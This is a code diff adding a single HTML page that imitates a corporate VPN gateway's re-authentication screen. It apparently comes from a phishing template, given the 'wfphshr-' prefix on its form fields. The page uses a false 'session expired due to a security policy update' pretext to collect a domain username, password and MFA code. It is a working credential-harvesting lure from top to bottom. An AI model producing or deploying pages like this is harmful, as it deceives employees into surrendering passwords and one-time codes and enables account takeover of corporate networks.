@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VPN Gateway — Re-authentication Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, 'Segoe UI', sans-serif; background: #e8ecf1;
+               min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .vpn-panel { width: 440px; background: #fff; border-radius: 8px;
+                     box-shadow: 0 4px 20px rgba(0,0,0,0.12); overflow: hidden; }
+        .top-bar { background: #1a237e; padding: 16px 20px; display: flex;
+                   align-items: center; gap: 12px; color: #fff; }
+        .top-bar .shield { font-size: 28px; }
+        .top-bar h1 { font-size: 16px; font-weight: 500; }
+        .top-bar small { font-size: 11px; opacity: 0.7; display: block; }
+        .body { padding: 28px; }
+        .alert-box { background: #fff8e1; border: 1px solid #ffe082; border-radius: 6px;
+                     padding: 12px 14px; margin-bottom: 20px; display: flex;
+                     align-items: flex-start; gap: 10px; }
+        .alert-box .icon { font-size: 20px; }
+        .alert-box .text { font-size: 13px; color: #5d4037; }
+        .field { margin-bottom: 16px; }
+        .field label { display: block; font-size: 12px; font-weight: 600;
+                       color: #333; margin-bottom: 4px; }
+        .field input, .field select { width: 100%; padding: 11px 12px;
+                                       border: 1px solid #ccc; border-radius: 6px;
+                                       font-size: 14px; }
+        .field input:focus { outline: none; border-color: #1a237e; }
+        .remember { display: flex; align-items: center; gap: 8px;
+                    font-size: 13px; color: #555; margin-bottom: 20px; }
+        .btn { width: 100%; padding: 13px; background: #1a237e; color: #fff;
+               border: none; border-radius: 6px; font-size: 15px;
+               font-weight: 600; cursor: pointer; }
+        .btn:hover { background: #283593; }
+        .mfa-note { text-align: center; font-size: 11px; color: #999; margin-top: 12px; }
+        .footer { padding: 14px; background: #f5f5f5; text-align: center;
+                  font-size: 10px; color: #aaa; border-top: 1px solid #eee; }
+    </style>
+</head>
+<body>
+    <div class="vpn-panel">
+        <div class="top-bar">
+            <div class="shield">&#128274;</div>
+            <div><h1>Corporate VPN Gateway</h1><small>Secure Access Portal</small></div>
+        </div>
+        <div class="body">
+            <div class="alert-box">
+                <div class="icon">&#9888;&#65039;</div>
+                <div class="text">Your VPN session has expired due to a security policy update. Please re-authenticate to restore secure access to corporate resources.</div>
+            </div>
+            <form method="POST" action="/login">
+                <div class="field">
+                    <label>Domain \ Username</label>
+                    <input type="text" name="wfphshr-username" placeholder="CORP\john.smith" required>
+                </div>
+                <div class="field">
+                    <label>Password</label>
+                    <input type="password" name="wfphshr-password" placeholder="Enter your password" required>
+                </div>
+                <div class="field">
+                    <label>Authentication Method</label>
+                    <select name="wfphshr-auth-method">
+                        <option>Push Notification (Authenticator)</option>
+                        <option>SMS Code</option>
+                        <option>Hardware Token</option>
+                        <option>Email OTP</option>
+                    </select>
+                </div>
+                <div class="field">
+                    <label>MFA Code (if applicable)</label>
+                    <input type="text" name="wfphshr-mfa" placeholder="6-digit code" maxlength="6" pattern="[0-9]*">
+                </div>
+                <div class="remember">
+                    <input type="checkbox" name="wfphshr-remember">
+                    <span>Remember this device for 30 days</span>
+                </div>
+                <button type="submit" class="btn">Authenticate</button>
+                <p class="mfa-note">A push notification will be sent to your registered device.</p>
+            </form>
+        </div>
+        <div class="footer">IT Security Department &mdash; Unauthorized access is prohibited and monitored</div>
+    </div>
+</body>
+</html>
